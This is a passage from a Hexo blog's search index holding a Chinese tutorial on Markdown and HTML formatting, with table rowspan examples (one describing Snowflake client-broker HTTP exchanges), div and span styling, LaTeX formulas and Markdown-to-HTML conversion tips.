class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>班级<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>课程<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>平均分<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;3&quot;</span>&gt;</span>1班<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>语文<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>95<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>数学<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>96<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>英语<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>92<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><table>     <tr>         <th>班级</th><th>课程</th><th>平均分</th>     </tr>     <tr>         <td rowspan="3">1班</td><td>语文</td><td>95</td>     </tr>     <tr>         <td>数学</td><td>96</td>     </tr>     <tr>         <td>英语</td><td>92</td>     </tr> </table><br><p>实践:</p><p><strong>注意!!! 列与列之间不要有空行</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>交互双方<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>交互方式<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>具体情况<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;4&quot;</span>&gt;</span>client向broker注册<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;3&quot;</span>&gt;</span>HTTP POST<span class="tag">&lt;<span class="name">br</span>&gt;</span>(SDP被包含在request body中)<span class="tag">&lt;<span class="name">br</span>&gt;</span>(向broker下的&#x27;/client发送请求&#x27;)<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>Client-&gt;Broker:<span class="tag">&lt;<span class="name">br</span>&gt;</span>```<span class="tag">&lt;<span class="name">br</span>&gt;</span>POST /client HTTP<span class="tag">&lt;<span class="name">br</span>&gt;</span>[offer SDP]<span class="tag">&lt;<span class="name">br</span>&gt;</span>```<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>Broker-&gt;Client<span class="tag">&lt;<span class="name">br</span>&gt;</span>若成功匹配到一个proxy,则返回proxy的SDP:<span class="tag">&lt;<span class="name">br</span>&gt;</span>```<span class="tag">&lt;<span class="name">br</span>&gt;</span>HTTP 200 OK[answer SDP]<span class="tag">&lt;<span class="name">br</span>&gt;</span>```<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>Broker-&gt;Client<span class="tag">&lt;<span class="name">br</span>&gt;</span>若没有匹配到可用的proxy,则返回503<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>AMP(Accelerated Mobile Pages)<span class="tag">&lt;<span class="name">br</span>&gt;</span>The broker&#x27;s /amp/client endpoint receives client poll messages encoded into the URL path, and sends client poll responses encoded as HTML that conforms to the requirements of AMP (Accelerated Mobile Pages). This endpoint is intended to be accessed through an AMP cache, using the ampcache option of snowflake-client.<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><table>    <tr>         <th>交互双方</th><th>交互方式</th><th>具体情况</th>    </tr>    <tr>        <td rowspan="4">client向broker注册</td>        <td rowspan="3">HTTP POST<br>(SDP被包含在request body中)<br>(向broker下的'/client发送请求')</td>        <td>Client->Broker:<br>```<br>POST /client HTTP<br>[offer SDP]<br>```</td>    </tr>    <tr>        <td>Broker->Client<br>若成功匹配到一个proxy,则返回proxy的SDP:<br>```<br>HTTP 200 OK[answer SDP]<br>```</td>    </tr>    <tr>        <td>Broker->Client<br>若没有匹配到可用的proxy,则返回503</td>    </tr>    <tr>        <td>AMP(Accelerated Mobile Pages)<br>The broker's /amp/client endpoint receives client poll messages encoded into the URL path, and sends client poll responses encoded as HTML that conforms to the requirements of AMP (Accelerated Mobile Pages). This endpoint is intended to be accessed through an AMP cache, using the ampcache option of snowflake-client.</td>        <td></td>     </tr></table><br><hr><br><h1 id="8-使用HTML标签"><a href="#8-使用HTML标签" class="headerlink" title="8 使用HTML标签"></a>8 使用HTML标签</h1><p>对于 HTML 的块级元素 div、table、pre 和 p，请在其前后使用<strong>空行</strong>与其它内容进行分隔。尽量<strong>不要使用制表符（tabs）或空格（spaces）对 HTML 标签做缩进</strong>，否则将影响格式。</p><p>在 HTML 块级标签内不能使用 Markdown 语法。</p><p>例如下面一个p区块中的加粗语法将不起作用:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;italic and **bold**&lt;/p&gt; </span><br></pre></td></tr></table></figure> <p>italic and **bold**</p> <hr><br><h2 id="8-1-常用标签"><a href="#8-1-常用标签" class="headerlink" title="8.1 常用标签:"></a>8.1 常用标签:</h2><h3 id="div区块"><a href="#div区块" class="headerlink" title="div区块"></a>div区块</h3><p>定义一个区域部分,在其中使用p标签来区分段落</p><p>可选项: </p><ul><li>align: 此区块的位置: left&#x2F;right&#x2F;center</li><li>style:<ul><li>font-size:15px 字体大小</li><li>font-family:kaiti 字体</li><li>color:black 颜色</li><li>background-color:#FFFF00  背景颜色,这里的代码是黄色</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:blue&quot;</span>&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个在 div 元素中的文本。<span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><div style="color:blue">       <p>这是一个在 div 元素中的文本。</p>    <p>这是一个在 div 元素中的文本。</p> </div><br><h3 id="span行内文本设置"><a href="#span行内文本设置" class="headerlink" title="span行内文本设置"></a>span行内文本设置</h3><p>在其他区块中的文本行内,对一部分文字进行修改</p><p>例如:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>我的母亲有 <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;color:blue&quot;</span>&gt;</span>蓝色<span class="tag">&lt;/<span class="name">span</span>&gt;</span> 的眼睛。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我的母亲有 <span style="color:blue">蓝色</span> 的眼睛。</p><p>还可以设置字体大小,是否加粗等. <code>style</code>内整体用引号包裹,属性之间使用分号做间隔</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;font-size:25px;font-weight:bold;background:yellow&quot;</span>&gt;</span>组件介绍:<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><br><h3 id="img插入图片"><a href="#img插入图片" class="headerlink" title="img插入图片"></a>img插入图片</h3><p><a href="#s1">看前面</a></p><br><hr><br><h1 id="9-LaTex语法"><a href="#9-LaTex语法" class="headerlink" title="9 LaTex语法"></a>9 LaTex语法</h1><p>参考: <a href="https://lanlan2017.github.io/blog/83c2e83a/">https://lanlan2017.github.io/blog/83c2e83a/</a></p><p>例如公式:</p><p>行内公式:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其他内容$a^2+b^2=c^2$其他内容</span><br></pre></td></tr></table></figure><p>$a^2+b^2&#x3D;c^2$</p><br><hr><br><h1 id="10-markdown转html时容易出现的问题"><a href="#10-markdown转html时容易出现的问题" class="headerlink" title="10 markdown转html时容易出现的问题"></a>10 markdown转html时容易出现的问题</h1><ul><li><p>正文里尽量不用到 html的&lt;标签&gt;,如果必须要用,把它们放到代码框里</p></li><li><p>尽量多用html标签,例如在typora中如果想添加空行,不要直接回车换行,而是使用</p><pre><code class="html">&lt;br&gt;</code></pre></li><li><p>后面遇到问题再从这里补充</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 搭建博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
